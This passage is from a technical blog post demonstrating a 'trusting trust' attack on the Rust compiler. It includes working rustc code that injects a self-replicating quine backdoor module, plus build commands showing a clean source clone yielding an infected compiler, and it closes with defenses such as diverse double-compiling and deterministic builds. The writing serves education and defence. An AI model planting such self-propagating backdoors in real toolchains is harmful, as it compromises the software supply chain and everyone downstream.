<p>Let’s add the code for the quineyness and for inserting the <code class="language-plaintext highlighter-rouge">fold_crate</code> call:</p>

<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">fn</span> <span class="nf">fold_mod</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="k">self</span><span class="p">,</span> <span class="n">m</span><span class="p">:</span> <span class="n">Mod</span><span class="p">)</span> <span class="k">-&gt;</span> <span class="n">Mod</span> <span class="p">{</span>
    <span class="k">let</span> <span class="n">new_items</span> <span class="o">=</span> <span class="n">m</span><span class="py">.items</span><span class="nf">.move_flat_map</span><span class="p">(|</span><span class="n">item</span><span class="p">|</span> <span class="p">{</span>
        <span class="c">// look for the phase_2_configure_and_expand function</span>
        <span class="k">if</span> <span class="n">item</span><span class="py">.ident.name</span><span class="nf">.as_str</span><span class="p">()</span> <span class="o">==</span> <span class="s">"phase_2_configure_and_expand"</span> <span class="p">{</span>
            <span class="c">// construct the code for the module contents as described earlier</span>
            <span class="k">let</span> <span class="n">code_for_module</span> <span class="o">=</span> <span class="s">r###"mod trust { static SELF_STRING: &amp;'static str = r##"###</span><span class="nf">.to_string</span><span class="p">()</span> <span class="o">+</span> <span class="s">r###"##""###</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">r###""##"###</span> <span class="o">+</span> <span class="s">r###"##;"###</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">"}"</span><span class="p">;</span>
            <span class="c">// Parse it into an AST by creating a crate only containing that code</span>
            <span class="k">let</span> <span class="n">new_crate</span> <span class="o">=</span> <span class="nf">parse_crate_from_source_str</span><span class="p">(</span><span class="s">"trust"</span><span class="nf">.into</span><span class="p">(),</span>
                                                        <span class="n">code_for_module</span><span class="p">,</span>
                                                        <span class="o">&amp;</span><span class="k">self</span><span class="py">.sess.parse_sess</span><span class="p">)</span><span class="nf">.unwrap</span><span class="p">();</span>
            <span class="c">// extract the AST of the contained module</span>
            <span class="k">let</span> <span class="n">inner_mod</span> <span class="o">=</span> <span class="n">new_crate</span><span class="py">.module.items</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="nf">.clone</span><span class="p">();</span>

            <span class="c">// now to insert the fold_crate() call</span>
            <span class="k">let</span> <span class="n">item</span> <span class="o">=</span> <span class="n">item</span><span class="nf">.map</span><span class="p">(|</span><span class="k">mut</span> <span class="n">i</span><span class="p">|</span> <span class="p">{</span>
                <span class="k">if</span> <span class="k">let</span> <span class="nn">ItemKind</span><span class="p">::</span><span class="nf">Fn</span><span class="p">(</span><span class="o">..</span><span class="p">,</span> <span class="k">ref</span> <span class="k">mut</span> <span class="n">block</span><span class="p">)</span> <span class="o">=</span> <span class="n">i</span><span class="py">.node</span> <span class="p">{</span>
                    <span class="o">*</span><span class="n">block</span> <span class="o">=</span> <span class="n">block</span><span class="nf">.clone</span><span class="p">()</span><span class="nf">.map</span><span class="p">(|</span><span class="k">mut</span> <span class="n">b</span><span class="p">|</span> <span class="p">{</span>
                        <span class="c">// create a temporary crate just containing a fold_crate call</span>
                        <span class="k">let</span> <span class="n">new_crate</span> <span class="o">=</span> <span class="nf">parse_crate_from_source_str</span><span class="p">(</span><span class="s">"trust"</span><span class="nf">.into</span><span class="p">(),</span>
                                                                    <span class="s">"fn trust() {let krate = trust::fold_crate(krate, sess);}"</span><span class="nf">.into</span><span class="p">(),</span>
                                                                    <span class="o">&amp;</span><span class="k">self</span><span class="py">.sess.parse_sess</span><span class="p">)</span><span class="nf">.unwrap</span><span class="p">();</span>
                        <span class="c">// extract the AST from the parsed temporary crate, shove it in here</span>
                        <span class="k">if</span> <span class="k">let</span> <span class="nn">ItemKind</span><span class="p">::</span><span class="nf">Fn</span><span class="p">(</span><span class="o">..</span><span class="p">,</span> <span class="k">ref</span> <span class="n">blk</span><span class="p">)</span> <span class="o">=</span> <span class="n">new_crate</span><span class="py">.module.items</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="py">.node</span> <span class="p">{</span>
                            <span class="n">b</span><span class="py">.stmts</span><span class="nf">.insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">blk</span><span class="py">.stmts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="nf">.clone</span><span class="p">());</span>
                        <span class="p">}</span>
                        <span class="n">b</span>
                    <span class="p">});</span>
                <span class="p">}</span>
                <span class="n">i</span>
            <span class="p">});</span>
            <span class="c">// yield both the created module and the modified function to move_flat_map</span>
            <span class="nd">vec!</span><span class="p">[</span><span class="n">inner_mod</span><span class="p">,</span> <span class="n">item</span><span class="p">]</span><span class="nf">.into_iter</span><span class="p">()</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nd">vec!</span><span class="p">[</span><span class="n">item</span><span class="p">]</span><span class="nf">.into_iter</span><span class="p">()</span>
        <span class="p">}</span>
    <span class="p">});</span>
    <span class="k">let</span> <span class="n">m</span> <span class="o">=</span> <span class="n">Mod</span> <span class="p">{</span>
        <span class="n">inner</span><span class="p">:</span> <span class="n">m</span><span class="py">.inner</span><span class="p">,</span>
        <span class="n">items</span><span class="p">:</span> <span class="n">new_items</span><span class="p">,</span>
    <span class="p">};</span>
    <span class="nf">noop_fold_mod</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="k">self</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">#</code>s let us specify “raw strings” in Rust, where I can freely include other quotation marks
without needing to escape things. For a string starting with <code class="language-plaintext highlighter-rouge">n</code> pound symbols, we can have raw
strings with up to <code class="language-plaintext highlighter-rouge">n - 1</code> pound symbols inside it. The <code class="language-plaintext highlighter-rouge">SELF_STRING</code> is declared with four pound
symbols, and the code in the trust module only uses raw strings with three pound symbols. Since the
code needs to generate the declaration of <code class="language-plaintext highlighter-rouge">SELF_STRING</code> (with four pound symbols), we manually
concatenate extra pound symbols on – a 4-pound-symbol raw string will not be valid within a three-
pound-symbol raw string since the parser will try to end the string early. So we don’t ever directly
type a sequence of four consecutive pound symbols in the code, and instead construct it by
concatenating two pairs of pound symbols.</p>

<p>Ultimately, the <code class="language-plaintext highlighter-rouge">code_for_module</code> declaration really does the same as:</p>

<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">let</span> <span class="n">code_for_module</span> <span class="o">=</span> <span class="s">"mod trust { static SELF_STRING: &amp;'static str = </span><span class="se">\"</span><span class="s">"</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">"</span><span class="se">\"</span><span class="s">;"</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">"}"</span><span class="p">;</span>
</code></pre></div></div>

<p>conceptually, but also ensures that things stay escaped. I could get similar results by calling into
a function that takes a string and inserts literal backslashes at the appropriate points.</p>

<p>To update <code class="language-plaintext highlighter-rouge">SELF_STRING</code>, we just need to include all the code inside the <code class="language-plaintext highlighter-rouge">trust</code> module after the
declaration of <code class="language-plaintext highlighter-rouge">SELF_STRING</code> itself inside the string. I won’t include this inline since it’s big,
but <a href="https://github.com/Manishearth/rust/blob/rusting-trust/src/librustc_driver/driver.rs#L541">this is what it looks like in the end</a>.</p>

<p>If we try compiling this code to stage 2 after updating <code class="language-plaintext highlighter-rouge">SELF_STRING</code>, we will get errors about
duplicate <code class="language-plaintext highlighter-rouge">trust</code> modules, which makes sense because we’re actually already compiling an already-
backdoored version of the Rust source code. While we could set up two Rust builds, the easiest way
to verify if our attack is working is to just use <code class="language-plaintext highlighter-rouge">#[cfg(stage0)]</code> on the trust module and the
<code class="language-plaintext highlighter-rouge">fold_crate</code> call<sup id="fnref:4" role="doc-noteref"><a href="#fn:4" class="footnote">5</a></sup>. These will only get included during “stage 0” (when it compiles the stage 1
compiler<sup id="fnref:7" role="doc-noteref"><a href="#fn:7" class="footnote">6</a></sup>), and not when it compiles the stage 2 compiler, so if the stage 2 compiler still
backdoors executables, we’re done.</p>

<p>On building the stage 2 (<code class="language-plaintext highlighter-rouge">make rustc-stage2</code>) compiler,</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rustup run stage2 rustc test.rs
<span class="nv">$ </span>./test
जगाला नमस्कार
</code></pre></div></div>

<p>I was also able to make it work with a separate clone of Rust:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cd</span> /path/to/new/clone
<span class="c"># Tell rustup to use our backdoored stage1 compiler whenever rustc is invoked</span>
<span class="c"># from anywhere inside this folder.</span>
<span class="nv">$ </span>rustup override <span class="nb">set </span>stage1 <span class="c"># Works with stage 2 as well.</span>

<span class="c"># with --enable-local-rust, instead of the downloaded stage 0 compiler compiling</span>
<span class="c"># stage 0 internal libraries (like libsyntax), the libraries from the local Rust get used. Hence we</span>
<span class="c"># need to check out a git commit close to our changes. This commit is the parent of our changes,</span>
<span class="c"># and is bound to work</span>
<span class="nv">$ </span>git checkout bfa709a38a8c607e1c13ee5635fbfd1940eb18b1

<span class="c"># This will make it call `rustc` instead of downloading its own compiler.</span>
<span class="c"># We already overrode rustc to be our backdoored compiler for this folder</span>
<span class="c"># using rustup</span>
<span class="nv">$ </span>./configure <span class="nt">--enable-local-rust</span>
<span class="c"># build it!</span>
<span class="nv">$ </span>make rustc-stage1
<span class="c"># Tell rustup about the new toolchain</span>
<span class="nv">$ </span>rustup toolchain <span class="nb">link </span>other-stage1 /path/to/new/clone/target_dir/stage1
<span class="nv">$ </span>rustup run other-stage1 rustc test.rs
<span class="nv">$ </span>./test
जगाला नमस्कार
</code></pre></div></div>

<p>Thus, a pristine copy of the rustc source has built a compiler infected with the backdoor.</p>

<hr />

<p>So we now have a working trusting trust attack in Rust. What can we do with it? Hopefully nothing!
This particular attack isn’t very robust, and while that can be improved upon, building a practical
and resilient trusting trust attack that won’t get noticed is a bit trickier.</p>

<p>We in the Rust community should be working on ways to prevent such attacks from being successful, though.</p>

<p>A couple of things we could do are:</p>

<ul>
  <li>Work on an alternate Rust compiler (in Rust or otherwise). For a pair of self-hosted compilers, there’s a technique called <a href="http://www.acsa-admin.org/countering-trusting-trust-through-diverse-double-compiling/">“Diverse Double-Compiling”</a> wherein you choose an arbitrary sequence of compilers (something like “<code class="language-plaintext highlighter-rouge">gcc</code> followed by 3x <code class="language-plaintext highlighter-rouge">clang</code> followed by <code class="language-plaintext highlighter-rouge">gcc</code>” followed by <code class="language-plaintext highlighter-rouge">clang</code>), and compile each compiler with the output of the previous one. Difficulty of writing a backdoor that can survive this process grows exponentially.</li>
  <li>Try compiling rustc from its ocaml roots, and package up the process into a shell script so that you have reproducible trustworthy rustc builds.</li>
  <li>Make rustc builds deterministic, which means that a known-trustworthy rustc build can be compared against a suspect one to figure out if it has been tampered with.</li>
</ul>

<p>Overall trusting trust attacks aren’t that pressing a concern since there are many other ways to get
approximately equivalent access with the same threat model. Having the ability to insert any
backdoor into distributed binaries is bad enough, and should be protected against regardless of
whether or not the backdoor is a self-propagating one. If someone had access to the distribution or
build servers, for example, they could as easily insert a backdoor into the <em>server</em>, or place a key
so that they can reupload tampered binaries when they want. Now, cleaning up after these attacks is
easier than trusting trust, but ultimately this is like comparing being at the epicenter of Little
Boy or the Tsar Bomba – one is worse, but you’re atomized regardless, and your mitigation plan
shouldn’t need to change.</p>

<p>But it’s certainly an interesting attack, and should be something we should at least be thinking
about.</p>

<p><em>Thanks to Josh Matthews, Nika Layzell, Diane Hosfelt, Eevee, and Yehuda Katz for reviewing drafts of this post.</em></p>

<p><small>Discuss: <a href="https://news.ycombinator.com/item?id=13091941">HN</a>, <a href="https://www.reddit.com/r/rust/comments/5g5hib/reflections_on_rusting_trust/">Reddit</a></small></p>
<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p>Of course, <em>this</em> raises the question of whether or not your assembler/OS/loader/processor is backdoored. Ultimately, you have to trust <em>someone</em>, which was partly the point of Thompson’s talk. <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:5" role="doc-endnote">
      <p>The AST turns up in the metadata/debuginfo/error messages, can be inspected from the command line, and in general is very far upstream and affects a number of things (all the other stages in the pipeline). You could write code to strip it out from these during inspection and only have it turn up in the binary, but that is much harder. <a href="#fnref:5" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:2" role="doc-endnote">
      <p>The local variable is called <code class="language-plaintext highlighter-rouge">krate</code> because <code class="language-plaintext highlighter-rouge">crate</code> is a keyword <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:3" role="doc-endnote">
      <p>Stage 1 takes the downloaded (older) rust compiler and compiles the sources from it. The stage 2 compiler is build when the stage 1 compiler (which is a “new” compiler) is used to compile the sources again. <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:4" role="doc-endnote">
      <p>Using it on the <code class="language-plaintext highlighter-rouge">fold_crate</code> call requires enabling the “attributes on statements” feature, but that’s no big deal – we’re only using the cfgs to be able to test easily; this feature won’t actually be required if we use our stage1 compiler to compile a clean clone of the sources. <a href="#fnref:4" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:7" role="doc-endnote">
      <p>The numbering of the stages is a bit confusing. During “stage 0” (<code class="language-plaintext highlighter-rouge">cfg(stage0)</code>), the stage 1 compiler is <em>built</em>. Since you are building the stage 1 compiler, the make invocation is <code class="language-plaintext highlighter-rouge">make rustc-stage1</code>. Similarly, during stage 1, the stage 2 compiler is built, and the invocation is <code class="language-plaintext highlighter-rouge">make rustc-stage2</code> but you use <code class="language-plaintext highlighter-rouge">#[cfg(stage1)]</code> in the code. <a href="#fnref:7" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>
</div>


  <footer>
    <p class="meta">
      
<span class="byline author vcard beforesep">Posted by <span class="fn">Manish Goregaokar</span></span>

      





      


<span class="aftersep beforesep">
    <a class='category' href='/blog/categories/mozilla/'><img width='16px' style='border:none;box-shadow:none;vertical-align:middle;' src='/images/mozilla-dino.png' title='This post will show up on planet.mozilla.org' /></a>
</span>


<span class="categories aftersep">
  
    <a class='category' href='/blog/categories/programming/'>programming</a>, <a class='category' href='/blog/categories/rust/'>rust</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://manishearth.github.io/blog/2016/12/02/reflections-on-rusting-trust/" data-via="Manishearth" data-counturl="http://manishearth.github.io/blog/2016/12/02/reflections-on-rusting-trust/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2016/08/18/gc-support-in-rust-api-design/" title="Previous Post: GC support in Rust: API design">&laquo; GC support in Rust: API design</a>
      
      
        <a class="basic-alignment right" href="/blog/2017/01/10/rust-tidbits-box-is-special/" title="Next Post: Rust tidbits: Box is special">Rust tidbits: Box is special &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
<h1> About Me </h1>
<div id="about">
    I'm a self-taught programmer with interests in programming languages, online communities, human languages, Rust, and physics, to name a few. <br><br>

    I'm currently on the Rust core team, and I work at Google on <a href="https://github.com/unicode-org/icu4x">ICU4X</a>.
</div>
<div id="doodads">
 <a href="http://twitter.com/Manishearth" style="white-space:normal">   <img style="border:none;box-shadow:none" src="/images/twitter.png" width="30px"></a>
 <a href="http://github.com/Manishearth" style="white-space:normal">   <img style="border:none;box-shadow:none"  src="/images/github.png" width="30px"></a>
</div>
</section>
<section>
<!-- <iframe scrolling="no" style="border: 0; height: 58px; width: 208px; overflow: hidden;" src="https://se-flair.appspot.com/751483b5-3bd0-467a-b3aa-f0bb8ac3887d/"></iframe> -->
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2021/04/05/a-tour-of-safe-tracing-gc-designs-in-rust/">A Tour of Safe Tracing GC Designs in Rust</a>
      </li>
    
      <li class="post">
        <a href="/blog/2021/03/15/arenas-in-rust/">Arenas in Rust</a>
      </li>
    
      <li class="post">
        <a href="/blog/2021/02/22/integrating-rust-and-c-plus-plus-in-firefox/">Integrating Rust and C++ in Firefox</a>
      </li>
    
      <li class="post">
        <a href="/blog/2019/10/09/on-voting-systems/">On Voting Systems</a>
      </li>
    
      <li class="post">
        <a href="/blog/2019/02/04/rust-governance-scaling-empathy/">Rust Governance: Scaling Empathy</a>
      </li>
    
  </ul>
</section>

  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2021 - Manish Goregaokar - Licensed under <a href="https://creativecommons.org/licenses/by-sa/4.0/">CC BY SA 4.0</a> - 
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
